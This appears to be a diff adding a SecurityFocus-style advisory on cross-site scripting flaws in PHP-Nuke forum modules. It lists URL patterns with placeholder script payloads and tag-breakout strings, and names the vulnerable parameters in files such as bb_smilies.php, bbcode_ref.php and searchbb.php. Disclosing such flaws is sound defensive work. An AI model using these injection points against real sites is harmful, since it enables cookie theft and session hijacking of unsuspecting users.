@@ -1,0 +1,36 @@
+source: http://www.securityfocus.com/bid/6409/info
+
+It has been discovered that multiple PHP scripts used by PHP-Nuke are vulnerable to cross-sitescripting attacks. Due to insufficient sanitization of web requests it is possible for script code to be embedded in PHP script requests.
+
+By constructing a malicious link which exploits one of these vulnerabilities, it may be possible to execute arbitrary code within the context of a website visited by an unsuspecting user. This may allow a remote attacker to steal cookie-based authentication credentials, which could be used at a later time to hijack a users web session. 
+
+http://[target]/modules/Forums/bb_smilies.php?name=[SCRIPT]
+http://[target]/modules/Forums/bb_smilies.php?Default_Theme=[SCRIPT]
+http://[target]/modules/Forums/bb_smilies.php?site_font=}--></style>[SCRIPT]
+http://[target]/modules/Forums/bb_smilies.php?bgcolor1=">[SCRIPT]
+or with :
+$sitename
+$table_width
+$color1
+$forumver
+
+/modules/Forums/bbcode_ref.php with :
+$name
+$Default_Theme
+$site_font
+$sitename
+$bgcolor2
+$textcolor1
+$bgcolor1
+$forumver
+
+/modules/Forums/editpost.php, /modules/Forums/newtopic.php,
+/modules/Forums/reply.php, /modules/Forums/topicadmin.php,
+/modules/Forums/viewforum.php with :
+$name
+
+/modules/Forums/searchbb.php with :
+$name
+$bgcolor3
+$bgcolor1
+
